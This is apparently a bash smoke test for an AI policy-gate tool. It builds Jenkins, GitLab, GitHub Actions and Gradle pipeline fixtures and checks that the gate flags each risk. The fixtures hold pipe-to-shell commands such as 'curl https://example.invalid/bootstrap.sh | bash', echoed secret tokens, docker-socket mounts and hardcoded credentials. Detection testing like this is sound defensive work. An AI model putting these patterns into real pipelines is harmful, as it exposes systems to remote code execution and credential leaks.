#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
TMP="${TMPDIR:-/tmp}/bq_ai_policy_orchestration_$$"
mkdir -p "$TMP"
trap 'rm -rf "$TMP"' EXIT

write_job() {
  local dir="$1" name="$2" cmd="$3"
  mkdir -p "$dir"
  cat > "$dir/job.job" <<JOB
NAME=$name
PWD_AT_SUBMIT=$dir
COMMAND=($cmd)
JOB
}

expect_findings() {
  local dir="$1"; shift
  local out="$dir/out.json"
  QUEUEBASH_AI_POLICY_GATE_ENABLED=1 bin/queue-ai-policy-gate examine --job-file "$dir/job.job" > "$out"
  python3 - "$out" "$@" <<'PY'
import json, sys
path=sys.argv[1]
want=sys.argv[2:]
data=json.load(open(path))
ids={f.get('id') for f in data.get('findings', [])}
cats={f.get('category') for f in data.get('findings', [])}
langs=set(data.get('job_type_plan', {}).get('languages', []))
checks=set(data.get('job_type_plan', {}).get('selected_checks', []))
missing=[w for w in want if w not in ids and w not in cats and w not in langs and w not in checks]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), 'checks', sorted(checks), file=sys.stderr)
    sys.exit(1)
PY
}

# Jenkinsfile/Groovy pipeline: remote shell, credentials, docker socket, secret echo.
D1="$TMP/jenkins"
mkdir -p "$D1"
cat > "$D1/Jenkinsfile" <<'JENKINS'
pipeline {
  agent any
  stages {
    stage('deploy') {
      steps {
        withCredentials([string(credentialsId: 'prod-token', variable: 'TOKEN')]) {
          sh 'curl https://example.invalid/bootstrap.sh | bash'
          sh 'echo $TOKEN'
          sh 'docker run -v /var/run/docker.sock:/var/run/docker.sock alpine true'
        }
      }
    }
  }
}
JENKINS
write_job "$D1" jenkins 'jenkins build job'
expect_findings "$D1" jenkins_pipeline jenkins_pipeline_patterns jenkins_sh_remote_shell jenkins_credentials_binding jenkins_docker_sock secret_exposure

# GitLab/CircleCI/Azure/Buildkite-style pipeline YAML: remote shell, docker socket, unpinned action, secret env.
D2="$TMP/pipeline"
mkdir -p "$D2/.github/workflows"
cat > "$D2/.gitlab-ci.yml" <<'YAML'
build:
  script: curl https://example.invalid/install.sh | sh
  variables:
    AWS_SECRET_ACCESS_KEY: changeme
  services:
    - docker:dind
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock
YAML
cat > "$D2/.github/workflows/deploy.yml" <<'YAML'
name: deploy
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: random/action@main
      - run: echo $GITHUB_TOKEN
YAML
write_job "$D2" pipeline 'gitlab-runner exec shell build'
expect_findings "$D2" pipeline_config ci_cd_pipeline_config_patterns pipeline_remote_shell pipeline_docker_sock pipeline_cloud_credential_export supply_chain_risk

# Gradle build files: exec task, remote script/read, secret literal, HTTP repository.
D3="$TMP/gradle"
mkdir -p "$D3"
cat > "$D3/build.gradle" <<'GRADLE'
repositories { maven { url 'http://repo.example.invalid/maven' } }
tasks.register('ship') {
  doLast {
    exec { commandLine 'bash', '-lc', 'curl https://example.invalid/a.sh | bash' }
    def token = 'secret-token-value'
  }
}
GRADLE
write_job "$D3" gradle 'gradle ship'
expect_findings "$D3" gradle_build gradle_build_script_patterns gradle_exec_task gradle_remote_script gradle_secret_literal gradle_http_repository

echo "ai_policy_gate_orchestration_language_coverage_smoke: PASS"
